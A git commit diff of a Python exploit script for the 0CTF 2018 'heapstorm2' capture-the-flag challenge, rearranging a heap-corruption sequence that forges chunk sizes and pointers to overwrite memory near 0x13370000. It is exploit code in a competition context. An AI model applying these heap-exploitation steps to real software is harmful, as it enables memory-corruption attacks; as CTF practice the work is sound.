ca52ed00e96bdbc2baa785c02dd37867e50577fd
fangdada <1278466220@qq.com>
2018-12-17 11:08:18 +0800

    update

--- 0CTF2018/heapstorm2/heapstorm2.py
+++ 0CTF2018/heapstorm2/heapstorm2.py
@@ -37,51 +37,52 @@ def view(index):
 
 while True:
 
-	try:
-		p=process('./heapstorm2')
-		alloc(0x18)     # 0
-		alloc(0x520)    # 1
-		alloc(0x18)     # 2
-		
-		alloc(0x18)     # 3
-		alloc(0x520)    # 4
-		alloc(0x18)     # 5
-		alloc(0x18)     # 6
-		
-		update(1,'a'*0x4f0+p64(0x500))
-		dele(1)
-		update(0,'a'*12)
-		alloc(0x18)     # 1
-		alloc(0x4d0)    # 7
-		dele(1)
-		dele(2)
-		alloc(0x38)     # 1
-		alloc(0x500)    # 2
-		
-		update(4,'a'*0x4f0+p64(0x500))
-		dele(4)
-		update(3,'a'*12)
-		alloc(0x18)     # 4
-		alloc(0x4d0)    # 8
-		dele(4)
-		dele(5)
-		alloc(0x48)     # 4
-		dele(2)
-		break
-		#alloc(0x4f0)   
-	except:
-		p.close()
-		continue
+    try:
+        p=process('./heapstorm2')
+        alloc(0x18)     # 0
+        alloc(0x520)    # 1
+        alloc(0x18)     # 2
+        
+        alloc(0x18)     # 3
+        alloc(0x520)    # 4
+        alloc(0x18)     # 5
+        alloc(0x18)     # 6
+        
+        update(1,'a'*0x4f0+p64(0x500))
+        dele(1)
+        update(0,'a'*12)
+        alloc(0x18)     # 1
+        alloc(0x4d0)    # 7
+        dele(1)
+        dele(2)
+        alloc(0x38)     # 1
+        alloc(0x500)    # 2
+        
+        update(4,'a'*0x4f0+p64(0x500))
+        dele(4)
+        update(3,'a'*12)
+        alloc(0x18)     # 4
+        alloc(0x4d0)    # 8
+        dele(4)
+        dele(5)
+        alloc(0x48)     # 4
+        dele(2)
+        alloc(0x500)    # 2
+        
+        dele(2)
+        addr=0x13370000+0x800-0x20
+        update(7,p64(0)*3+p64(0x511)+p64(0)+p64(addr))
+        update(8,p64(0)*5+p64(0x501)+p64(0)+p64(addr+8)+p64(0)+p64(addr-0x18-5))
+        
+        alloc(0x48)     # 2
 
-alloc(0x500)    # 2
-dele(2)
+        break
+        #alloc(0x4f0)   
+    except:
+    	p.close()
+	continue
 
 
-addr=0x13370000+0x800-0x20
-update(7,p64(0)*3+p64(0x511)+p64(0)+p64(addr))
-update(8,p64(0)*5+p64(0x501)+p64(0)+p64(addr+8)+p64(0)+p64(addr-0x18-5))
-
-alloc(0x48)     # 2
 
 update(2,p64(0)*5+p64(0x13377331)+p64(addr+0x20+0x30))
 update(0,p64(addr+3)+p64(8))
